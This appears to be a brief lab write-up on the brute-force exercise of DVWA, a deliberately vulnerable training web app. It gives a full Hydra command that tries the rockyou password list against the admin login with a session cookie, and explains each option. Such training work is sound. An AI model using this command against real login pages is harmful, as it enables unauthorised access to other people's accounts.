## BRUTE FORCE

Attack :

We will attack using the Hydra tool. First, we need to obtain the cookies from the website.

![image](https://github.com/user-attachments/assets/b58c9bc4-8ed9-410e-84d7-f626b2426b48)
 
using hyra tool:

payload:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
"http-get-form://172.17.128.158/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: security=medium; PHPSESSID=5ba0cf3c373c345a17dbcfb19b595c31:F=Username and/or password incorrect"
```
This Hydra command is used for brute-forcing the login of a website.

-Target: 172.17.128.158/DVWA/vulnerabilities/brute/

-Username: Always "admin"

-Passwords: Attempted from the rockyou.txt list

-Cookies: Includes session info to bypass security

-Failure pattern: Looks for "incorrect password" message to know when to try the next password

![image](https://github.com/user-attachments/assets/fa79da0e-1857-40c3-8b0c-30cda63cb211)
